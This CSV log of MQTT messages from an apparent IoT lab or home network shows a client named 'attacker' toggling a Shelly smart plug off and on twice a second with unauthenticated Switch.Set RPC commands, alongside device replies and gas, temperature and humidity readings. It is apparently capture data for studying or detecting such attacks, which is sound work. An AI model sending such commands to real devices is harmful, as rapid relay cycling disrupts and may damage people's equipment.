timestamp,topic,payload_size_bytes,payload_preview
2026-04-22T16:40:00,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34533.64,""swi"
2026-04-22T16:40:00,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5537 34533.655 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:01,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:01,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5538 34534.139 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:01,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:01,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34534.14,""swi"
2026-04-22T16:40:01,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5539 34534.158 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:01,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:01,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5540 34534.639 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:01,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:01,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34534.64,""swi"
2026-04-22T16:40:01,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5541 34534.655 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:02,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:02,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5542 34535.140 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:02,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:02,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34535.14,""swi"
2026-04-22T16:40:02,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5543 34535.159 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:02,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:02,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5544 34535.642 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:02,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:02,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34535.64,""swi"
2026-04-22T16:40:02,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5545 34535.659 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:03,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:03,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5546 34536.141 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:03,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:03,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34536.14,""swi"
2026-04-22T16:40:03,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5547 34536.159 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:03,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:03,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5548 34536.641 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:03,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:03,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34536.64,""swi"
2026-04-22T16:40:03,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5549 34536.658 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:04,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:04,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5550 34537.141 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:04,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:04,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34537.14,""swi"
2026-04-22T16:40:04,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5551 34537.160 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:04,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:04,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5552 34537.642 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:04,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:04,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34537.64,""swi"
2026-04-22T16:40:04,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5553 34537.659 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:05,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:05,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5554 34538.143 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:05,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:05,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:40:05,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:40:05,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34538.14,""swi"
2026-04-22T16:40:05,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5555 34538.161 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:05,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:05,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5556 34538.643 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:05,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:05,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34538.64,""swi"
2026-04-22T16:40:05,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5557 34538.660 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:06,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:06,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:06,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5558 34539.144 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:06,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:06,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34539.14,""swi"
2026-04-22T16:40:06,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5559 34539.163 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:06,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:06,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:06,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5560 34539.644 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:06,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:06,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34539.64,""swi"
2026-04-22T16:40:06,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5561 34539.660 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:40:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:40:06,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:40:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:40:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:40:07,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:07,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5562 34540.145 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:07,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:07,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34540.14,""swi"
2026-04-22T16:40:07,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5563 34540.164 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:07,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:07,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5564 34540.646 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:07,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:07,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34540.64,""swi"
2026-04-22T16:40:07,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5565 34540.663 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:08,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:08,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:08,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5566 34541.147 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:08,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:08,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34541.14,""swi"
2026-04-22T16:40:08,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5567 34541.166 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:08,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:08,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:08,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5568 34541.647 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:08,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:08,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34541.64,""swi"
2026-04-22T16:40:08,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5569 34541.664 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:09,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:09,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:09,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5570 34542.148 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:09,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:09,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34542.14,""swi"
2026-04-22T16:40:09,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5571 34542.167 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:09,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:09,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:09,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5572 34542.648 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:09,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:09,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34542.65,""swi"
2026-04-22T16:40:09,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5573 34542.665 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:10,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:10,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:10,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5574 34543.149 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:10,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:10,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34543.15,""swi"
2026-04-22T16:40:10,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:40:10,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5575 34543.168 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:10,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:40:10,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:10,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:10,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5576 34543.650 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:10,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:10,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34543.65,""swi"
2026-04-22T16:40:10,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5577 34543.666 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:11,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:11,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:11,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5578 34544.150 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:11,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:11,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34544.15,""swi"
2026-04-22T16:40:11,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5579 34544.169 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:11,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:11,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:11,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5580 34544.650 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:11,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:11,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34544.65,""swi"
2026-04-22T16:40:11,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5581 34544.667 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:40:12,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:40:12,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:40:12,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5582 34545.152 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:12,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:40:12,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34545.15,""swi"
2026-04-22T16:40:12,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5583 34545.171 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:40:12,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:40:12,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:40:12,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5584 34545.651 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:40:12,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:40:12,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34545.65,""swi"
2026-04-22T16:40:12,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5585 34545.668 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
